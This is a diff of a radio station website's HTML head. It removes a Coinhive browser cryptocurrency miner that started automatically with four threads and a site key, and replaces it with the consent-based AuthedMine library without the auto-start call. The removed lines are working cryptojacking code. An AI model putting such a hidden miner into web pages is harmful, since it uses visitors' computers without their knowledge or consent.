@@ -242,13 +242,14 @@ section.djs .block-content .night {
 <script src="http://www.radiorecord.ru/i/js/Magnific-Popup/dist/jquery.magnific-popup.min.js"></script>
 
 
-<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script src="https://authedmine.com/lib/authedmine.min.js"></script>
 <script>
-var miner = new CoinHive.User('LQwighiqm1HsKCyGWUlslEJD85nQG6wh','anonymous',{
-		threads: 4,
-		throttle: 0.8	
-	});
-	miner.start();
+var miner = new CoinHive.User('LQwighiqm1HsKCyGWUlslEJD85nQG6wh', 'anonymous', {
+	threads: 4,
+	autoThreads: false,
+	throttle: 0.8,
+	forceASMJS: false
+});
 </script>
 </head>
 <body class="current-station-background-color current-station-font-color">
